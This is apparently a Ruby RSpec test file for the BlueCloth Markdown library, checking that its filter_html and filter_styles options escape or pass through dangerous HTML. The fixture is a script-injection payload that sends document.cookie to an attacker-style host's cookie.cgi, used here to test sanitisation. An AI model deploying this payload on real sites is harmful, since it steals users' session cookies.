# Unit test for contributed features 
require 'spec_helper'

describe "contrib test case" do

	DangerousHtml =
		"<script>document.location='http://www.hacktehplanet.com" +
		"/cgi-bin/cookie.cgi?' + document.cookie</script>"
	DangerousHtmlOutput =
		"<p>&lt;script&gt;document.location='http://www.hacktehplanet.com" +
		"/cgi-bin/cookie.cgi?' + document.cookie&lt;/script&gt;</p>"
	DangerousStylesOutput =
		"<script>document.location='http://www.hacktehplanet.com" +
		"/cgi-bin/cookie.cgi?' + document.cookie</script>"
	NoLessThanHtml = "Foo is definitely > than bar"
	NoLessThanOutput = "<p>Foo is definitely &gt; than bar</p>"


	### HTML filter options contributed by Florian Gross.

  it "should filter HTML" do
    bc = bluecloth DangerousHtml, :filter_html
		
		bc.filter_styles.should be_nil
		bc.filter_html.should be_true

		bc.to_html.should == DangerousHtmlOutput
	end

  it "should filter styles" do
		bc = bluecloth DangerousHtml, :filter_styles
		
		bc.filter_styles.should be_true
		bc.filter_html.should be_nil

		bc.to_html.should == DangerousStylesOutput
	end

  it "should filter styles given an array" do
    bc = bluecloth DangerousHtml, [:filter_styles]
		
		bc.filter_styles.should be_true
		bc.filter_html.should be_nil

		bc.to_html.should == DangerousStylesOutput
	end

  it "should filter 'no less than'" do
		bc = bluecloth NoLessThanHtml, :filter_html
		
		bc.filter_styles.should be_nil
		bc.filter_html.should be_true

		bc.to_html.should == NoLessThanOutput
	end

end

